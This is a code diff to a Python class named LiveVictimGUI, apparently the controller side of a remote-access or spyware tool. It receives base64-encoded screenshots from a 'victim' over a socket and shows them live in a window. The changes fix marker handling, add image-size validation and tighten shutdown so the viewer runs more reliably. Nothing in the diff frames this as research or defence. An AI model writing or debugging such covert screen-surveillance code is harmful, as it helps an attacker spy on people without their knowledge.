@@ -63,17 +63,19 @@ class LiveVictimGUI:
                     if not data:
                         break
                     buffer += data
-                    while "LIVE_START" in buffer and "LIVE_END" in buffer:
+                    while b"LIVE_START" in buffer and b"LIVE_END" in buffer:
                             try:
                                 marker_start = b"LIVE_START\n"
                                 marker_end = b"\nLIVE_END"
                                 start = buffer.find(marker_start)
                                 end = buffer.find(marker_end, start)
                                 if start != -1 and end != -1:
-                                    img_part = buffer[start + len(marker_start):end]
+                                    img_part = buffer[start + len(marker_start):end].strip()
                                     buffer = buffer[end + 9:]
                                     try:
                                         img_data = base64.b64decode(img_part)
+                                        if len(img_data) < 100:
+                                            raise ValueError("Invalid image data")
                                         image = Image.open(io.BytesIO(img_data))
                                         image = image.resize((850, 600), Image.Resampling.LANCZOS)
                                         photo = ImageTk.PhotoImage(image)
@@ -85,6 +87,8 @@ class LiveVictimGUI:
                                 continue
                     time.sleep(0.01)
                 except socket.timeout:
+                    if not self.running:
+                        break
                     continue
                 except Exception as e:
                     if self.running:
@@ -95,10 +99,13 @@ class LiveVictimGUI:
         except Exception as e:
             print(str(e))
     def update_image(self, photo):
+        if not self.running:
+            return
         try:
             self.canvas.delete("all")
             self.canvas.create_image(425, 300, image=photo, anchor='center')
             self.canvas.image = photo 
+            self.root.update_idletasks()
         except Exception as e:
             print(str(e))
     def stop_view(self):
